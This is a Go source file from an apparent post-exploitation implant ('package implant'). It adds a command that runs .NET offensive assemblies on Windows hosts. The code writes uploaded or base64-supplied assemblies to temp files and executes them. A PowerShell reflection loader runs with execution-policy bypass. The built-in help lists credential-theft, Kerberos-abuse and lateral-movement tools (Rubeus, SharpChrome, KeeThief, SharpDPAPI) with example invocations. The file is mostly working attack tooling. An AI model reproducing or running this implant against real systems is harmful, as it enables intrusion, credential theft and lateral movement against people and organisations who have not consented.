package implant

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// ══════════════════════════════════════════
//  .NET ASSEMBLY EXECUTION
// ══════════════════════════════════════════
// Execute .NET assemblies in-memory without dropping to disk.
// Supports: Seatbelt, SharpHound, Rubeus, SharpUp, Certify, etc.

func ExecuteAssembly(args []string, data []byte) ([]byte, error) {
	if len(args) == 0 && len(data) == 0 {
		return []byte(`Assembly Execution Commands:
  assembly <path> [args]        Load and execute .NET assembly
  assembly inline <base64>      Execute base64-encoded assembly
  assembly list                 List common assemblies

Common Assemblies:
  Seatbelt.exe      — System enumeration & security checks
  SharpHound.exe    — BloodHound data collector
  Rubeus.exe        — Kerberos abuse (asktgt, kerberoast, asreproast)
  SharpUp.exe       — Privilege escalation checks
  Certify.exe       — ADCS enumeration and exploitation
  SharpDPAPI.exe    — DPAPI credential decryption
  SharpChrome.exe   — Chrome credential/cookie extraction
  SharpView.exe     — .NET port of PowerView
  SharpWMI.exe      — WMI-based lateral movement
  SharpRDP.exe      — Remote Desktop execution

Usage:
  assembly Seatbelt.exe -group=all
  assembly Rubeus.exe kerberoast
  assembly SharpHound.exe -c All -d digitalshield.local`), nil
	}

	if len(args) > 0 && args[0] == "list" {
		return []byte(`Available .NET Assemblies (upload or specify path):
  Seatbelt.exe        — Comprehensive security enumeration
  SharpHound.exe      — BloodHound AD collector
  Rubeus.exe          — Kerberos attack toolkit
  SharpUp.exe         — Privilege escalation audit
  Certify.exe         — ADCS exploitation
  SharpDPAPI.exe      — DPAPI credential recovery
  SharpChrome.exe     — Chrome credential theft
  SharpView.exe       — AD enumeration (PowerView port)
  SharpWMI.exe        — WMI lateral movement
  SharpRDP.exe        — RDP command execution
  SharpSCCM.exe       — SCCM exploitation
  Snaffler.exe        — Sensitive file finder
  KeeThief.exe        — KeePass credential extraction
  SharpGPOAbuse.exe   — GPO privilege escalation`), nil
	}

	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf(".NET assembly execution requires Windows (use mono for Linux)")
	}

	// Handle inline base64 assembly
	if len(args) > 0 && args[0] == "inline" {
		if len(args) < 2 {
			return nil, fmt.Errorf("usage: assembly inline <base64_data> [args]")
		}
		decoded, err := base64.StdEncoding.DecodeString(args[1])
		if err != nil {
			return nil, fmt.Errorf("invalid base64: %w", err)
		}
		data = decoded
		if len(args) > 2 {
			args = args[2:]
		} else {
			args = nil
		}
	}

	// If data provided (uploaded assembly bytes) — write to temp and execute
	if len(data) > 0 {
		tmpPath := filepath.Join(os.TempDir(), "asm_"+fmt.Sprintf("%d", len(data))+".exe")
		os.WriteFile(tmpPath, data, 0755)
		defer os.Remove(tmpPath)
		return executeAssemblyFromFile(tmpPath, args)
	}

	// If path provided
	if len(args) > 0 {
		assemblyPath := args[0]
		assemblyArgs := args[1:]

		// Check if file exists
		if _, err := os.Stat(assemblyPath); err != nil {
			return nil, fmt.Errorf("assembly not found: %s (upload it first or provide full path)", assemblyPath)
		}

		return executeAssemblyFromFile(assemblyPath, assemblyArgs)
	}

	return nil, fmt.Errorf("provide assembly path, inline base64, or upload assembly data")
}

// Execute .NET assembly from file with timeout and crash protection
func executeAssemblyFromFile(path string, args []string) (result []byte, retErr error) {
	// Recover from any panic to prevent agent crash
	defer func() {
		if r := recover(); r != nil {
			result = []byte(fmt.Sprintf("[-] Assembly execution panicked: %v", r))
			retErr = fmt.Errorf("panic: %v", r)
		}
	}()

	// Run with 120 second timeout
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, path, args...)
	cmd.Env = os.Environ()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	// Combine output
	out := stdout.Bytes()
	if stderr.Len() > 0 {
		if len(out) > 0 {
			out = append(out, '\n')
		}
		out = append(out, stderr.Bytes()...)
	}

	// Truncate if too large (>500KB output)
	if len(out) > 500*1024 {
		out = append(out[:500*1024], []byte("\n\n[!] Output truncated (500KB limit)")...)
	}

	if len(out) > 0 {
		header := fmt.Sprintf("[+] Assembly executed: %s %s\n\n", filepath.Base(path), strings.Join(args, " "))
		return append([]byte(header), out...), nil
	}

	if ctx.Err() == context.DeadlineExceeded {
		return []byte(fmt.Sprintf("[-] Assembly timed out after 120s: %s", filepath.Base(path))), nil
	}

	if err != nil {
		return []byte(fmt.Sprintf("[-] Assembly failed: %v\n[*] Try: shell %s %s", err, path, strings.Join(args, " "))), nil
	}

	return []byte("[*] Assembly executed — no output"), nil
}

// Execute .NET assembly in-memory via PowerShell reflection
func executeAssemblyInMemory(data []byte, args []string) ([]byte, error) {
	b64 := base64.StdEncoding.EncodeToString(data)

	argsStr := ""
	if len(args) > 0 {
		quotedArgs := make([]string, len(args))
		for i, a := range args {
			quotedArgs[i] = fmt.Sprintf("'%s'", a)
		}
		argsStr = strings.Join(quotedArgs, ",")
	}

	// PowerShell in-memory assembly execution
	psScript := fmt.Sprintf(`
$bytes = [Convert]::FromBase64String('%s')
$assembly = [Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
if ($entryPoint -ne $null) {
    $args = @(,@(%s))
    $entryPoint.Invoke($null, $args)
} else {
    Write-Output "[-] No entry point found in assembly"
}
`, b64, argsStr)

	// Write temp PS1 and execute
	tmpDir := os.TempDir()
	tmpFile := filepath.Join(tmpDir, "asm_loader.ps1")
	os.WriteFile(tmpFile, []byte(psScript), 0644)
	defer os.Remove(tmpFile)

	cmd := exec.Command("powershell", "-ep", "bypass", "-f", tmpFile)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return out, fmt.Errorf("assembly execution failed: %w\n%s", err, string(out))
	}

	return append([]byte("[+] .NET assembly executed in-memory\n\n"), out...), nil
}
